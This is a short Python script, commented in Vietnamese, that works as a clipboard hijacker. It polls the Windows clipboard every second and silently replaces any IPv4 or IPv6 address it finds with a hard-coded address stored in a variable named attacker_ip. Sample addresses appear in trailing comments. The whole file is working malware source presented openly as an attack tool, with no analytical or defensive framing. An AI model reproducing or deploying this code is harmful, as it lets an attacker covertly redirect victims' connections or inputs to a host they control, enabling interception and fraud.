import win32clipboard,re
from time import sleep
attacker_ip = "172.217.194.113"

ipv4_regex = r'[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}'
ipv6_regex = r'[a-f0-9]{1,4}:[a-f0-9]{1,4}:[a-f0-9]{1,4}:[a-f0-9]{1,4}:[a-f0-9]{1,4}:[a-f0-9]{1,4}:[a-f0-9]{1,4}:[a-f0-9]{1,4}'
while True:
    # mở clipboard để truy cập
    win32clipboard.OpenClipboard()

    # lấy nội dung clipboard và loại bỏ khoảng trắng cuối
    data = win32clipboard.GetClipboardData().rstrip()
    
    if (re.search(ipv4_regex,data) or re.search(ipv6_regex,data)):
        # nếu đúng thì xóa nội dung clipboard
        win32clipboard.EmptyClipboard()
        
        win32clipboard.SetClipboardText(attacker_ip)
    # đóng clipboard để giải phóng tài nguyên
    win32clipboard.CloseClipboard()
    # tạm dừng 1 giây trước khi kiểm tra lại
    sleep(1)

# 172.20.10.2
# 2401:d800:bd01:d85b:a08c:2c0:e630:4914


